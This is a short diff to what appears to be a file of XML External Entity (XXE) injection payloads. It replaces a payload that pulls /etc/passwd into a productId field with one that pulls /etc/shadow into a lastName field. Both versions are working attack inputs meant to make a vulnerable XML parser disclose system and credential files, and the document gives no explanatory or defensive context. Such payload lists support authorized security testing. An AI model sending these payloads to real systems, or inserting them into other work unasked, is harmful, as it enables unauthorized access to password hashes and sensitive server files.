@@ -1,3 +1,6 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
-<stockCheck><productId>&xxe;</productId></stockCheck> 
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
+<header>
+ <firstName>John</firstName>
+ <lastName>&ent;</lastName>
+</header>
